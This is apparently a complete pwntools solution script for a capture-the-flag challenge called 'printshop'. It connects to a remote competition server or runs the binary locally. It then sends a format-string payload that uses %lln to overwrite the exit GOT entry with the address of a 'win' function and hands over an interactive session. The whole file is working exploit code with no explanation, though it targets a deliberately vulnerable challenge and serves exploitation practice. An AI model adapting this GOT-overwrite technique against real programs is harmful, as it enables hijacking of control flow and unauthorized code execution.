#!/usr/bin/python3

from pwn import *

exe = ELF('printshop', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x00000000004013ba

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.pctf.competitivecyber.club', 7997)
else:
        p = process(exe.path)

GDB()
payload = f"%{exe.sym.win}c%8$lln".encode()
payload = payload.ljust(16, b'a') + p64(exe.got.exit)
sla(b">> ", payload)
p.interactive()
